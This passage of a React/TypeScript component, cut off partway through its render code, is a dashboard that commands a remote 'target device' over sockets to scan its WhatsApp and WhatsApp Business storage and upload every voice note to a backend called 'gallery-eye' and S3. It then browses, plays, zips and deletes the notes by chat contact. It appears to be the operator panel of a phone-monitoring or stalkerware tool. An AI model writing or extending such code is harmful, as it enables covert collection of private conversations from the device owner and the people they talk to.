"use client";

import React, { useState, useEffect, useRef, useCallback, useMemo } from 'react';
import {
    RefreshCw, Trash2, Download, Play, Pause,
    Mic, X, ChevronRight, Search, CheckCheck,
    CheckSquare, Square, ArrowLeft, Radio,
    Sparkles, Volume2, Folder, Layers, CheckCircle2,
    Circle, AlertTriangle, Archive, FileAudio, Check
} from 'lucide-react';

// ──────────────────────────────────────────────────────────────────────────────
// Types
// ──────────────────────────────────────────────────────────────────────────────
interface WaVoice {
    id: string;
    url: string;
    folderName: string;
    contactName?: string;
    created_at: string;
    size?: number;
    name: string;
    deviceId?: string;
    isNew?: boolean;
}

interface DeviceFolder {
    name: string;
    count: number;
    newCount?: number;
    totalSize?: number;
    latestTimestamp?: number;
}

interface GroupedVoices {
    [folderName: string]: WaVoice[];
}

interface WhatsAppVoiceViewProps {
    socket?: any;
    selectedDeviceId: string | null;
    userUuid: string;
    setDeleteConfirmation: (data: { isOpen: boolean; ids: string[] }) => void;
}

const BASE_URL = 'https://p01--gallery-eye--9zr85m7yb6s4.code.run';

// ──────────────────────────────────────────────────────────────────────────────
// Claymorphic Waveform Audio Player
// ──────────────────────────────────────────────────────────────────────────────
function ClayWavePlayer({
    url,
    isGlobalPlaying,
    onPlayToggle,
    onEnded
}: {
    url: string;
    isGlobalPlaying: boolean;
    onPlayToggle: () => void;
    onEnded: () => void;
}) {
    const audioRef = useRef<HTMLAudioElement>(null);
    const [progress, setProgress] = useState(0);
    const [duration, setDuration] = useState(0);
    const [hasError, setHasError] = useState(false);
    const [isLoading, setIsLoading] = useState(false);

    useEffect(() => {
        const audio = audioRef.current;
        if (!audio) return;
        if (isGlobalPlaying) {
            setIsLoading(true);
            setHasError(false);
            audio.play()
                .then(() => setIsLoading(false))
                .catch((err) => {
                    console.warn('[ClayWavePlayer] Play failed:', err);
                    setIsLoading(false);
                });
        } else {
            audio.pause();
        }
    }, [isGlobalPlaying]);

    useEffect(() => {
        const audio = audioRef.current;
        if (!audio) return;

        const onTimeUpdate = () => setProgress(audio.currentTime);
        const onLoadedMetadata = () => {
            setDuration(audio.duration || 0);
            setIsLoading(false);
        };
        const onWaiting = () => setIsLoading(true);
        const onCanPlay = () => setIsLoading(false);
        const onEndedHandler = () => {
            setProgress(0);
            onEnded();
        };
        const onErrorHandler = () => {
            setHasError(true);
            setIsLoading(false);
            onEnded();
        };

        audio.addEventListener('timeupdate', onTimeUpdate);
        audio.addEventListener('loadedmetadata', onLoadedMetadata);
        audio.addEventListener('waiting', onWaiting);
        audio.addEventListener('canplay', onCanPlay);
        audio.addEventListener('ended', onEndedHandler);
        audio.addEventListener('error', onErrorHandler);

        return () => {
            audio.removeEventListener('timeupdate', onTimeUpdate);
            audio.removeEventListener('loadedmetadata', onLoadedMetadata);
            audio.removeEventListener('waiting', onWaiting);
            audio.removeEventListener('canplay', onCanPlay);
            audio.removeEventListener('ended', onEndedHandler);
            audio.removeEventListener('error', onErrorHandler);
        };
    }, [onEnded]);

    const formatTime = (s: number) => {
        if (!isFinite(s) || isNaN(s) || s <= 0) return '0:00';
        const m = Math.floor(s / 60);
        const sec = Math.floor(s % 60);
        return `${m}:${sec.toString().padStart(2, '0')}`;
    };

    const handleSeek = (e: React.MouseEvent<HTMLDivElement> | React.TouchEvent<HTMLDivElement>) => {
        if (!audioRef.current || !duration || duration <= 0) return;
        const rect = e.currentTarget.getBoundingClientRect();
        const clientX = 'touches' in e ? e.touches[0].clientX : e.clientX;
        const ratio = Math.max(0, Math.min(1, (clientX - rect.left) / rect.width));
        audioRef.current.currentTime = ratio * duration;
        setProgress(ratio * duration);
    };

    const progressPct = duration > 0 ? (progress / duration) * 100 : 0;
    const barCount = 28;

    return (
        <div className="flex items-center gap-3 w-full select-none">
            <audio ref={audioRef} src={url} preload="metadata" crossOrigin="anonymous" />

            {/* Tactile Play/Pause Clay Button */}
            <button
                type="button"
                onClick={onPlayToggle}
                className={`w-11 h-11 rounded-2xl flex items-center justify-center shrink-0 transition-all duration-200 cursor-pointer active:scale-95 shadow-md ${
                    isGlobalPlaying
                        ? 'bg-gradient-to-tr from-[#10b981] to-[#25D366] text-black shadow-[0_0_18px_rgba(37,211,102,0.5)] border border-emerald-300/40 scale-105'
                        : 'clay-icon-pod text-emerald-400 hover:text-emerald-300 hover:border-emerald-500/40'
                }`}
                title={isGlobalPlaying ? 'Pause' : 'Play'}
            >
                {isLoading ? (
                    <RefreshCw className="w-4 h-4 animate-spin text-current" />
                ) : isGlobalPlaying ? (
                    <Pause className="w-4 h-4 fill-black text-black" />
                ) : (
                    <Play className="w-4 h-4 fill-current ml-0.5" />
                )}
            </button>

            {/* Waveform Visualization & Scrub Track */}
            <div
                className="flex-1 flex flex-col justify-center py-1 cursor-pointer group"
                onClick={handleSeek}
            >
                <div className="flex items-end gap-[2px] sm:gap-[3px] h-7 w-full">
                    {Array.from({ length: barCount }).map((_, i) => {
                        const barPct = (i / barCount) * 100;
                        const isFilled = barPct <= progressPct;

                        const seed = Math.sin((i + 1) * 1.6);
                        const baseHeight = 25 + Math.abs(seed) * 70;
                        const dynamicHeight = isGlobalPlaying
                            ? Math.min(100, Math.max(20, baseHeight + Math.sin(Date.now() / 150 + i) * 15))
                            : baseHeight;

                        return (
                            <div
                                key={i}
                                className={`flex-1 rounded-full transition-all duration-150 ${
                                    isFilled
                                        ? 'bg-gradient-to-t from-emerald-500 to-[#25D366] shadow-[0_0_6px_rgba(37,211,102,0.4)]'
                                        : 'bg-white/15 group-hover:bg-white/25'
                                }`}
                                style={{ height: `${dynamicHeight}%` }}
                            />
                        );
                    })}
                </div>

                {/* Micro Progress Track */}
                <div className="w-full h-[2.5px] bg-white/5 rounded-full mt-1.5 overflow-hidden">
                    <div
                        className="h-full bg-gradient-to-r from-emerald-500 to-[#25D366] transition-all duration-75"
                        style={{ width: `${progressPct}%` }}
                    />
                </div>
            </div>

            {/* Time / Error Indicator */}
            <div className="shrink-0 text-right font-mono text-[11px] text-white/50 w-12">
                {hasError ? (
                    <span className="text-red-400 text-[10px]">Error</span>
                ) : isGlobalPlaying ? (
                    formatTime(progress)
                ) : (
                    formatTime(duration)
                )}
            </div>
        </div>
    );
}

// ──────────────────────────────────────────────────────────────────────────────
// Tactile Avatar with Gradient & Monogram
// ──────────────────────────────────────────────────────────────────────────────
function TactileFolderAvatar({ name, hasNew }: { name: string; hasNew?: boolean }) {
    const initials = useMemo(() => {
        return name
            .replace(/[^a-zA-Z0-9 ]/g, '')
            .split(/\s+/)
            .filter(Boolean)
            .slice(0, 2)
            .map(w => w[0]?.toUpperCase() || '')
            .join('') || name.slice(0, 2).toUpperCase() || 'WA';
    }, [name]);

    const isBusiness = name.toLowerCase().includes('business') || name.toLowerCase().includes('wa business');

    return (
        <div className="relative shrink-0">
            <div className={`w-11 h-11 sm:w-12 sm:h-12 rounded-2xl flex items-center justify-center font-black text-xs sm:text-sm text-white shadow-lg border transition-transform group-hover:scale-105 ${
                isBusiness
                    ? 'bg-gradient-to-br from-amber-700/80 to-amber-950/90 border-amber-500/30 text-amber-200'
                    : 'bg-gradient-to-br from-emerald-800/80 to-[#0e3b26] border-emerald-500/30 text-emerald-200'
            }`}>
                {initials}
            </div>
            {hasNew && (
                <span className="absolute -top-1 -right-1 w-3.5 h-3.5 rounded-full bg-emerald-400 ring-2 ring-[#131417] shadow-[0_0_10px_#10b981] animate-pulse" />
            )}
        </div>
    );
}

// ──────────────────────────────────────────────────────────────────────────────
// Main Component
// ──────────────────────────────────────────────────────────────────────────────
export default function WhatsAppVoiceView({
    socket,
    selectedDeviceId,
    userUuid,
    setDeleteConfirmation
}: WhatsAppVoiceViewProps) {
    const [voices, setVoices] = useState<WaVoice[]>([]);
    const [isFetching, setIsFetching] = useState(false);
    const [fetchError, setFetchError] = useState<string | null>(null);

    // Live Sync HUD
    const [isSyncing, setIsSyncing] = useState(false);
    const [syncProgress, setSyncProgress] = useState<{
        uploaded: number;
        total: number;
        folder: string;
        file?: string;
        partIndex?: number;
        totalParts?: number;
    } | null>(null);

    // Device Folders Discovery Modal
    const [isFolderModalOpen, setIsFolderModalOpen] = useState(false);
    const [deviceFolders, setDeviceFolders] = useState<DeviceFolder[]>([]);
    const [isFetchingFolders, setIsFetchingFolders] = useState(false);
    const [selectedFolderToSync, setSelectedFolderToSync] = useState<string>('all');

    // Navigation & Search
    const [selectedFolder, setSelectedFolder] = useState<string | null>(null);
    const [searchQuery, setSearchQuery] = useState('');
    const [filterNewOnly, setFilterNewOnly] = useState(false);

    // Playback state
    const [playingId, setPlayingId] = useState<string | null>(null);

    // Selection mode (inside detail view)
    const [isSelectMode, setIsSelectMode] = useState(false);
    const [selected, setSelected] = useState<Set<string>>(new Set());

    // Outside folder ZIP download / delete state
    const [downloadingFolders, setDownloadingFolders] = useState<Set<string>>(new Set());
    const [isDownloadingSelectedZip, setIsDownloadingSelectedZip] = useState(false);
    const [folderToDelete, setFolderToDelete] = useState<{ name: string; count: number } | null>(null);
    const [isDeletingFolder, setIsDeletingFolder] = useState(false);

    // High-volume pagination (prevents UI freeze on folders with 500+ voice notes)
    const [visibleCount, setVisibleCount] = useState(40);

    // ── Fetch Voices from Backend ──
    const fetchVoices = useCallback(async () => {
        if (!userUuid || !selectedDeviceId) return;
        setIsFetching(true);
        setFetchError(null);
        try {
            const res = await fetch(
                `${BASE_URL}/whatsapp-voices?uuid=${encodeURIComponent(userUuid)}&deviceId=${encodeURIComponent(selectedDeviceId)}&limit=1000`
            );
            if (!res.ok) throw new Error(`HTTP ${res.status}`);
            const data = await res.json();
            const items: WaVoice[] = (data.items || []).map((item: any) => ({
                id: item.id,
                url: item.url,
                folderName: item.folderName || 'Unknown Chat',
                contactName: item.contactName || item.folderName || 'Unknown',
                created_at: item.created_at,
                size: item.size,
                name: item.name || item.id?.split('/').pop() || 'voice.ogg',
                deviceId: item.deviceId || selectedDeviceId,
                isNew: Boolean(item.isNew)
            }));
            setVoices(items);
        } catch (err: any) {
            setFetchError(err.message || 'Failed to load voice notes');
        } finally {
            setIsFetching(false);
        }
    }, [userUuid, selectedDeviceId]);

    // ── Open Folder Selection Modal ──
    const handleOpenFolderModal = () => {
        if (!selectedDeviceId || !socket) return;
        setIsFolderModalOpen(true);
        setIsFetchingFolders(true);
        socket.emit('get_wa_voice_folders', {
            uuid: userUuid,
            targetDeviceId: selectedDeviceId
        });
    };

    // ── Trigger Device Sync for Selected Folder ──
    const handleConfirmSyncFolder = (targetFolder: string) => {
        if (!selectedDeviceId || !socket) return;
        setIsFolderModalOpen(false);
        setIsSyncing(true);
        setSyncProgress({
            uploaded: 0,
            total: 0,
            folder: targetFolder === 'all' ? 'All WhatsApp Folders' : targetFolder
        });
        socket.emit('trigger_wa_voice_sync', {
            uuid: userUuid,
            targetDeviceId: selectedDeviceId,
            folderName: targetFolder,
            limit: -1
        });
    };

    // ── Socket Events ──
    useEffect(() => {
        if (!socket) return;

        const onFoldersReceived = (data: any) => {
            setIsFetchingFolders(false);
            let list: DeviceFolder[] = [];
            if (Array.isArray(data)) {
                list = data;
            } else if (data && Array.isArray(data.folders)) {
                list = data.folders;
            }
            setDeviceFolders(list);
        };

        const onProgress = (data: any) => {
            if (data.deviceId && selectedDeviceId && data.deviceId !== selectedDeviceId) return;
            setIsSyncing(true);
            setSyncProgress({
                uploaded: data.uploaded || 0,
                total: data.total || 0,
                folder: data.folder || data.currentFolder || 'WhatsApp',
                file: data.file || data.currentFile,
                partIndex: data.partIndex,
                totalParts: data.totalParts
            });
        };

        const onComplete = (data: any) => {
            if (data.deviceId && selectedDeviceId && data.deviceId !== selectedDeviceId) return;
            setIsSyncing(false);
            setSyncProgress(null);
            fetchVoices();
        };

        const onVoiceReady = (data: any) => {
            if (data.deviceId && selectedDeviceId && data.deviceId !== selectedDeviceId) return;
            setVoices(prev => {
                const exists = prev.some(v => v.id === data.id || v.url === data.url);
                if (exists) return prev;
                const newVoice: WaVoice = {
                    id: data.id,
                    url: data.url,
                    folderName: data.folderName || 'WhatsApp',
                    name: data.name || 'voice.ogg',
                    created_at: data.created_at || new Date().toISOString(),
                    deviceId: data.deviceId || selectedDeviceId || undefined,
                    isNew: true
                };
                return [newVoice, ...prev];
            });
        };

        socket.on('wa_voice_folders', onFoldersReceived);
        socket.on('wa_voice_progress', onProgress);
        socket.on('wa_voice_complete', onComplete);
        socket.on('whatsapp_voice_ready', onVoiceReady);

        return () => {
            socket.off('wa_voice_folders', onFoldersReceived);
            socket.off('wa_voice_progress', onProgress);
            socket.off('wa_voice_complete', onComplete);
            socket.off('whatsapp_voice_ready', onVoiceReady);
        };
    }, [socket, selectedDeviceId, fetchVoices]);

    useEffect(() => {
        fetchVoices();
        setSelectedFolder(null);
        setPlayingId(null);
        setSelected(new Set());
        setIsSelectMode(false);
        setVisibleCount(40);
    }, [selectedDeviceId, userUuid]);

    // Reset pagination when navigating into a folder
    useEffect(() => {
        setVisibleCount(40);
        setSelected(new Set());
        setIsSelectMode(false);
        setPlayingId(null);
    }, [selectedFolder]);

    // ── Group voices by folder ──
    const grouped: GroupedVoices = useMemo(() => {
        return voices.reduce((acc, v) => {
            if (!acc[v.folderName]) acc[v.folderName] = [];
            acc[v.folderName].push(v);
            return acc;
        }, {} as GroupedVoices);
    }, [voices]);

    const totalNewCount = useMemo(() => {
        return voices.filter(v => v.isNew).length;
    }, [voices]);

    const clearAllNewBadges = () => {
        setVoices(prev => prev.map(v => ({ ...v, isNew: false })));
    };

    // Sort folders by item count descending
    const sortedFolders = useMemo(() => {
        return Object.keys(grouped).sort(
            (a, b) => grouped[b].length - grouped[a].length
        );
    }, [grouped]);

    // Filter folders
    const filteredFolders = useMemo(() => {
        return sortedFolders.filter(f => {
            const matchesSearch = f.toLowerCase().includes(searchQuery.toLowerCase());
            if (!matchesSearch) return false;
            if (filterNewOnly) {
                return (grouped[f] || []).some(v => v.isNew);
            }
            return true;
        });
    }, [sortedFolders, grouped, searchQuery, filterNewOnly]);

    // Current folder voice notes
    const currentVoicesRaw = useMemo(() => {
        if (!selectedFolder) return [];
        return [...(grouped[selectedFolder] || [])].sort(
            (a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime()
        );
    }, [selectedFolder, grouped]);

    const currentVoices = useMemo(() => {
        return filterNewOnly ? currentVoicesRaw.filter(v => v.isNew) : currentVoicesRaw;
    }, [currentVoicesRaw, filterNewOnly]);

    const visibleVoices = useMemo(() => {
        return currentVoices.slice(0, visibleCount);
    }, [currentVoices, visibleCount]);

    // ── Download Entire Folder as ZIP ──
    const handleDownloadFolderZip = async (folderName: string, e?: React.MouseEvent) => {
        if (e) e.stopPropagation();
        const items = grouped[folderName] || [];
        if (items.length === 0) return;

        setDownloadingFolders(prev => new Set(prev).add(folderName));
        try {
            const urls = items.map(v => v.url);
            const res = await fetch(`${BASE_URL}/download-zip`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ urls })
            });
            if (!res.ok) throw new Error(`Server returned HTTP ${res.status}`);

            const blob = await res.blob();
            const blobUrl = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = blobUrl;
            a.download = `${folderName.replace(/[\/\\:*?"<>|]/g, '_')}_voices.zip`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(blobUrl);
        } catch (err: any) {
            console.error('[DownloadFolderZip] Error:', err);
            alert(`Failed to download folder ZIP: ${err.message || 'Network error'}`);
        } finally {
            setDownloadingFolders(prev => {
                const next = new Set(prev);
                next.delete(folderName);
                return next;
            });
        }
    };

    // ── Delete Entire Folder ──
    const handlePromptDeleteFolder = (folderName: string, count: number, e?: React.MouseEvent) => {
        if (e) e.stopPropagation();
        setFolderToDelete({ name: folderName, count });
    };

    const handleConfirmDeleteFolder = async () => {
        if (!folderToDelete || !userUuid) return;
        setIsDeletingFolder(true);
        try {
            const res = await fetch(`${BASE_URL}/whatsapp-voices/delete-folder`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    uuid: userUuid,
                    deviceId: selectedDeviceId,
                    folderName: folderToDelete.name
                })
            });
            if (!res.ok) {
                const errData = await res.json().catch(() => ({}));
                throw new Error(errData.error || `HTTP ${res.status}`);
            }

            // Remove from local state
            setVoices(prev => prev.filter(v => v.folderName !== folderToDelete.name));
            if (selectedFolder === folderToDelete.name) {
                setSelectedFolder(null);
            }
            setFolderToDelete(null);
        } catch (err: any) {
            console.error('[DeleteFolder] Error:', err);
            alert(`Failed to delete folder: ${err.message || 'Server error'}`);
        } finally {
            setIsDeletingFolder(false);
        }
    };

    // ── Download Selected Files as ZIP (Inside Detail View) ──
    const handleDownloadSelectedZip = async () => {
        if (selected.size === 0) return;
        setIsDownloadingSelectedZip(true);
        try {
            const urls = currentVoices
                .filter(v => selected.has(v.id))
                .map(v => v.url);

            const res = await fetch(`${BASE_URL}/download-zip`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ urls })
            });
            if (!res.ok) throw new Error(`HTTP ${res.status}`);

            const blob = await res.blob();
            const blobUrl = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = blobUrl;
            a.download = `${(selectedFolder || 'whatsapp').replace(/[\/\\:*?"<>|]/g, '_')}_selected.zip`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(blobUrl);
        } catch (err: any) {
            console.error('[DownloadSelectedZip] Error:', err);
            alert(`Failed to download selected ZIP: ${err.message}`);
        } finally {
            setIsDownloadingSelectedZip(false);
        }
    };

    // ── Delete Individual / Selected Files ──
    const handleDeleteSelected = (ids: string[]) => {
        setDeleteConfirmation({ isOpen: true, ids });
        setVoices(prev => prev.filter(v => !ids.includes(v.id)));
        setSelected(new Set());
        setIsSelectMode(false);
    };

    // ── Download Single Audio ──
    const handleDownloadSingle = async (voice: WaVoice) => {
        try {
            const proxyUrl = `/api/download?url=${encodeURIComponent(voice.url)}&filename=${encodeURIComponent(voice.name)}`;
            const link = document.createElement('a');
            link.href = proxyUrl;
            link.download = voice.name;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        } catch {
            window.open(voice.url, '_blank');
        }
    };

    // ── Select All / None ──
    const toggleSelectAll = () => {
        if (selected.size === currentVoices.length) {
            setSelected(new Set());
        } else {
            setSelected(new Set(currentVoices.map(v => v.id)));
        }
    };

    const toggleSelect = (id: string) => {
        const next = new Set(selected);
        if (next.has(id)) next.delete(id);
        else next.add(id);
        setSelected(next);
    };

    // ── Formatters ──
    const fmtDate = (d: string) => {
        const date = new Date(d);
        if (isNaN(date.getTime())) return '';
        const now = new Date();
        const diff = (now.getTime() - date.getTime()) / 1000;
        if (diff < 3600) return `${Math.max(1, Math.floor(diff / 60))}m ago`;
        if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
        return date.toLocaleDateString([], { month: 'short', day: 'numeric' });
    };

    const fmtTime = (d: string) => {
        const date = new Date(d);
        if (isNaN(date.getTime())) return '';
        return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    };

    const formatBytes = (bytes?: number) => {
        if (!bytes || bytes <= 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return `${(bytes / Math.pow(k, i)).toFixed(1)} ${sizes[i]}`;
    };

    // ── Render Delete Folder Confirmation Modal ──
    const renderDeleteFolderModal = () => {
        if (!folderToDelete) return null;
        return (
            <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md animate-in fade-in duration-200">
                <div className="w-full max-w-md clay-card p-6 shadow-2xl space-y-4 border border-red-500/30">
                    <div className="flex items-start gap-3.5">
                        <div className="w-11 h-11 rounded-2xl bg-red-500/15 border border-red-500/30 flex items-center justify-center text-red-400 shrink-0">
                            <AlertTriangle className="w-6 h-6" />
                        </div>
                        <div className="space-y-1">
                            <h3 className="text-base font-bold text-white tracking-tight">Delete Entire Folder?</h3>
                            <p className="text-xs text-white/60 leading-relaxed">
                                You are about to permanently delete <strong className="text-white">{folderToDelete.name}</strong> containing{' '}
                                <strong className="text-red-400">{folderToDelete.count} voice notes</strong>.
                            </p>
                        </div>
                    </div>

                    <div className="p-3 rounded-xl bg-red-950/20 border border-red-900/30 text-[11px] font-mono text-red-300">
                        This action will remove all files from AWS S3 storage immediately.
                    </div>

                    <div className="flex items-center justify-end gap-2.5 pt-2">
                        <button
                            type="button"
                            onClick={() => setFolderToDelete(null)}
                            disabled={isDeletingFolder}
                            className="px-4 py-2 rounded-xl bg-white/5 hover:bg-white/10 text-white/70 hover:text-white text-xs font-semibold transition-colors cursor-pointer"
                        >
                            Cancel
                        </button>
                        <button
                            type="button"
                            onClick={handleConfirmDeleteFolder}
                            disabled={isDeletingFolder}
                            className="px-5 py-2 rounded-xl bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-bold text-xs shadow-lg shadow-red-500/20 active:scale-95 transition-all cursor-pointer flex items-center gap-1.5"
                        >
                            {isDeletingFolder ? (
                                <>
                                    <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                                    <span>Deleting...</span>
                                </>
                            ) : (
                                <>
                                    <Trash2 className="w-3.5 h-3.5" />
                                    <span>Delete Folder</span>
                                </>
                            )}
                        </button>
                    </div>
                </div>
            </div>
        );
    };

    // ── Render Live WhatsApp Folder Selection Modal ──
    const renderFolderModal = () => {
        if (!isFolderModalOpen) return null;

        const totalAvailableVoices = deviceFolders.reduce((acc, f) => acc + (f.count || 0), 0);
        const totalNewAvailable = deviceFolders.reduce((acc, f) => acc + (f.newCount || 0), 0);

        return (
            <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-black/80 backdrop-blur-md animate-in fade-in duration-200">
                <div className="w-full max-w-lg clay-card p-4 sm:p-6 shadow-[0_20px_60px_rgba(0,0,0,0.85)] flex flex-col max-h-[85vh] animate-in zoom-in-95 duration-200 border border-emerald-500/20">
                    {/* Header */}
                    <div className="flex items-start justify-between gap-3 pb-3 border-b border-white/10 shrink-0">
                        <div className="flex items-center gap-3">
                            <div className="w-10 h-10 rounded-2xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center text-emerald-400 shrink-0">
                                <Folder className="w-5 h-5" />
                            </div>
                            <div>
                                <h2 className="text-base font-bold text-white tracking-tight flex items-center gap-2">
                                    WhatsApp Voice Folders
                                    <span className="w-2 h-2 rounded-full bg-emerald-400 shadow-[0_0_8px_#10b981] animate-pulse" />
                                </h2>
                                <p className="text-xs text-white/50">
                                    Select target directory to sync live from mobile device
                                </p>
                            </div>
                        </div>
                        <button
                            type="button"
                            onClick={() => setIsFolderModalOpen(false)}
                            className="p-1.5 rounded-xl bg-white/5 hover:bg-white/10 text-white/50 hover:text-white transition-colors cursor-pointer"
                        >
                            <X size={18} />
                        </button>
                    </div>

                    {/* Body */}
                    <div className="flex-1 overflow-y-auto py-3 space-y-2.5 pr-1 min-h-[160px]">
                        {isFetchingFolders ? (
                            <div className="py-12 flex flex-col items-center justify-center gap-3 text-center">
                                <RefreshCw className="w-8 h-8 text-emerald-400 animate-spin" />
                                <div className="space-y-1">
                                    <p className="text-sm font-semibold text-white">Scanning Mobile Storage...</p>
                                    <p className="text-xs text-white/40 font-mono">Querying WhatsApp & Business media paths</p>
                                </div>
                            </div>
                        ) : (
                            <>
                                {/* Option: ALL FOLDERS */}
                                <div
                                    onClick={() => setSelectedFolderToSync('all')}
                                    className={`group relative p-3.5 rounded-2xl border transition-all cursor-pointer flex items-center justify-between gap-3 ${
                                        selectedFolderToSync === 'all'
                                            ? 'clay-history-item-active bg-emerald-500/10'
                                            : 'clay-history-item'
                                    }`}
                                >
                                    <div className="flex items-center gap-3 min-w-0">
                                        <div className={`w-9 h-9 rounded-xl flex items-center justify-center shrink-0 transition-colors ${
                                            selectedFolderToSync === 'all'
                                                ? 'bg-emerald-500 text-black shadow-[0_0_12px_rgba(16,185,129,0.5)]'
                                                : 'bg-white/10 text-white/70'
                                        }`}>
                                            <Layers className="w-4 h-4" />
                                        </div>
                                        <div className="min-w-0">
                                            <div className="flex items-center gap-2">
                                                <h3 className="text-sm font-bold text-white truncate">All WhatsApp Folders</h3>
                                                <span className="px-1.5 py-0.5 rounded text-[10px] font-mono bg-white/10 text-white/70">
                                                    All
                                                </span>
                                            </div>
                                            <p className="text-xs text-white/45 truncate mt-0.5">
                                                {totalAvailableVoices > 0
                                                    ? `${totalAvailableVoices} total voices across all folders`
                                                    : 'Sync all voice notes across all discovered directories'}
                                            </p>
                                        </div>
                                    </div>

                                    <div className="flex items-center gap-2 shrink-0">
                                        {totalNewAvailable > 0 && (
                                            <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-500/20 border border-emerald-500/40 text-emerald-400">
                                                +{totalNewAvailable} new
                                            </span>
                                        )}
                                        {selectedFolderToSync === 'all' ? (
                                            <CheckCircle2 className="w-5 h-5 text-emerald-400" />
                                        ) : (
                                            <Circle className="w-5 h-5 text-white/20 group-hover:text-white/40" />
                                        )}
                                    </div>
                                </div>

                                {/* List of Discovered Phone Folders */}
                                {deviceFolders.length > 0 && (
                                    <div className="pt-2">
                                        <div className="px-1 pb-1.5 flex items-center justify-between text-[11px] font-mono text-white/40 uppercase tracking-wider">
                                            <span>Discovered Folders ({deviceFolders.length})</span>
                                            <span>Voices / Status</span>
                                        </div>

                                        <div className="space-y-2">
                                            {deviceFolders.map((f) => {
                                                const isSelected = selectedFolderToSync === f.name;
                                                const newCount = f.newCount ?? 0;

                                                return (
                                                    <div
                                                        key={f.name}
                                                        onClick={() => setSelectedFolderToSync(f.name)}
                                                        className={`group relative p-3 rounded-2xl border transition-all cursor-pointer flex items-center justify-between gap-3 ${
                                                            isSelected
                                                                ? 'clay-history-item-active bg-emerald-500/10'
                                                                : 'clay-history-item'
                                                        }`}
                                                    >
                                                        <div className="flex items-center gap-3 min-w-0">
                                                            <div className={`w-9 h-9 rounded-xl flex items-center justify-center shrink-0 transition-colors ${
                                                                isSelected
                                                                    ? 'bg-emerald-500 text-black'
                                                                    : 'bg-white/10 text-white/60'
                                                            }`}>
                                                                <Folder className="w-4 h-4" />
                                                            </div>
                                                            <div className="min-w-0">
                                                                <h4 className="text-xs sm:text-sm font-semibold text-white truncate">
                                                                    {f.name}
                                                                </h4>
                                                                <div className="flex items-center gap-2 text-[11px] text-white/45 font-mono mt-0.5">
                                                                    <span>{f.count} audio files</span>
                                                                    {f.totalSize ? (
                                                                        <>
                                                                            <span>·</span>
                                                                            <span>{formatBytes(f.totalSize)}</span>
                                                                        </>
                                                                    ) : null}
                                                                </div>
                                                            </div>
                                                        </div>

                                                        <div className="flex items-center gap-2.5 shrink-0">
                                                            {newCount > 0 ? (
                                                                <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 animate-pulse">
                                                                    +{newCount} new
                                                                </span>
                                                            ) : (
                                                                <span className="text-[10px] font-mono text-white/30">
                                                                    cached
                                                                </span>
                                                            )}
                                                            {isSelected ? (
                                                                <CheckCircle2 className="w-5 h-5 text-emerald-400" />
                                                            ) : (
                                                                <Circle className="w-5 h-5 text-white/20 group-hover:text-white/40" />
                                                            )}
                                                        </div>
                                                    </div>
                                                );
                                            })}
                                        </div>
                                    </div>
                                )}

                                {deviceFolders.length === 0 && !isFetchingFolders && (
                                    <div className="p-4 rounded-2xl bg-white/[0.02] border border-white/5 text-center space-y-1">
                                        <p className="text-xs text-white/60">No cached sub-folders listed yet</p>
                                        <p className="text-[11px] text-white/35 font-mono">
                                            Choose &apos;All WhatsApp Folders&apos; to sync everything on device.
                                        </p>
                                    </div>
                                )}
                            </>
                        )}
                    </div>

                    {/* Footer */}
                    <div className="pt-3 border-t border-white/10 flex items-center justify-between gap-3 shrink-0">
                        <button
                            type="button"
                            onClick={() => {
                                setIsFetchingFolders(true);
                                socket.emit('get_wa_voice_folders', { uuid: userUuid, targetDeviceId: selectedDeviceId });
                            }}
                            className="px-3 py-2 rounded-xl bg-white/5 hover:bg-white/10 text-white/60 hover:text-white text-xs font-mono flex items-center gap-1.5 transition-colors cursor-pointer"
                            title="Rescan device folders"
                        >
                            <RefreshCw className={`w-3.5 h-3.5 ${isFetchingFolders ? 'animate-spin text-emerald-400' : ''}`} />
                            <span>Rescan</span>
                        </button>

                        <div className="flex items-center gap-2">
                            <button
                                type="button"
                                onClick={() => setIsFolderModalOpen(false)}
                                className="px-4 py-2 rounded-xl bg-white/5 hover:bg-white/10 text-xs font-semibold text-white/70 hover:text-white transition-colors cursor-pointer"
                            >
                                Cancel
                            </button>
                            <button
                                type="button"
                                onClick={() => handleConfirmSyncFolder(selectedFolderToSync)}
                                className="px-5 py-2 rounded-xl bg-gradient-to-r from-emerald-600 to-[#25D366] text-black font-bold text-xs shadow-[0_0_20px_rgba(37,211,102,0.4)] hover:brightness-110 active:scale-95 transition-all cursor-pointer flex items-center gap-1.5"
                            >
                                <Sparkles className="w-3.5 h-3.5 fill-black" />
                                <span>
                                    {selectedFolderToSync === 'all'
                                        ? 'Sync All Folders'
                                        : 'Sync Selected'}
                                </span>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        );
    };

    // ── Empty State ──
    if (!selectedDeviceId) {
        return (
            <div className="max-w-xl mx-auto flex flex-col items-center justify-center min-h-[400px] gap-3 px-4 animate-in fade-in duration-300">
                <div className="w-16 h-16 rounded-3xl clay-card flex items-center justify-center border border-white/10">
                    <Radio className="w-8 h-8 text-white/30" />
                </div>
                <p className="text-xs font-mono text-white/40 uppercase tracking-widest text-center">
                    Select a connected device to load audio
                </p>
            </div>
